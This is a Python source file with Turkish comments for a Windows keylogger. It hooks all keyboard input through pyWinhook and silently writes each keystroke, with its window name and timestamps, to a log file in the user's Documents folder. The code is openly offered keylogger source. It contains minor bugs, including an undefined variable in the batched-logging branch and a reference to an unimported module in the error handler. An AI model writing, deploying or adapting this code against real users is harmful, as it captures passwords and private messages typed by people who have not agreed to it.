#!/usr/bin/python
# -*- coding: utf-8 -*-

######################################################
#      PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA      
######################################################

try:
    import os, pyWinhook, pygame, atexit
    from datetime import datetime
except ImportError as ext:
    path = pyHook.__file__
    dllpath = os.path.join(path, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(f" DLL dosyaları koypalanmalı!")
    print()
    print(f"     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print(f"     Kopyalanacağı dizin:")
    print(f"         C:\Windows\System32")
    quit()

#############################################
#               SABİT DEĞERLER              
#############################################

LVL_DEBUG = 2 # Tuş basımı dahil her bilgiyi gösterir 
LVL_INFO = 1  # Ek bilgileri de gösterir
LVL_NONE = 0  # Çıktı yok

#############################################
#            EVRENSEL DEĞİŞKENLER           
#############################################

LOG_DIR = os.path.join(os.environ['userprofile'], "Documents", "KeyLogs")
LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".log"
LOG_LVL = LVL_NONE
KEY_LIMIT = 1

#############################################
#                FONKSİYONLAR               
#############################################

def parseData(event):
    keyData = []
    keyData.append(f"")
    keyData.append(f"UTC Time:    {datetime.utcnow()}")
    keyData.append(f"Boot Time:   {event.Time}")
    keyData.append(f"MessageName: {event.MessageName}")
    keyData.append(f"Message:     {event.Message}")
    keyData.append(f"Window:      {event.Window}")
    keyData.append(f"WindowName:  {event.WindowName}")
    keyData.append(f"Ascii:       {event.Ascii}")
    keyData.append(f"Key:         {event.Key}")
    keyData.append(f"KeyID:       {event.KeyID}")
    keyData.append(f"ScanCode:    {event.ScanCode}")
    keyData.append(f"Extended:    {event.Extended}")
    keyData.append(f"Injected:    {event.Injected}")
    keyData.append(f"Alt:         {event.Alt}")
    keyData.append(f"Transition:  {event.Transition}")
    keyData.append(f"")

    return keyData

def printKeyData(keyData):
    if LOG_LVL >= LVL_DEBUG:
        print("\n".join(keyData))



    """ char = chr(event.Ascii)
    logging.log(10, char) """

def logDirectly(keyData):
    CONTEXT_FILE.write("\n".join(keyData))
    CONTEXT_FILE.flush()


def logOnReach(keyData):

    def logListLines(list_keyData):
        for keyData in list_keyData:
            logDirectly(list_line)

    global list_keyData
    list_keyData.append(keyData)

    if len(list_keyData) > KEY_LIMIT:
        logListLines(list_keyData)


def OnKeyboardEvent(event):
    keyData = parseData(event)
    printKeyData(keyData)

    if KEY_LIMIT <= 1:
        logDirectly(keyData)
    else:
        logOnReach(keyData)

    return True

def openFile():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

    return open(os.path.join(LOG_DIR, LOG_FILE), "a+", encoding="utf-8")

def onexit():
    CONTEXT_FILE.close()

def pumpMessage():
    pygame.init()
    while True:
        pygame.event.pump()

#############################################
#           PROGRAMIN ÇALIŞMA YERI
############################################# 

CONTEXT_FILE = openFile()
list_keyData = []

atexit.register(onexit) # TODO: Bunu nasıl aktif kılarım bilmiyorum

hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pumpMessage()
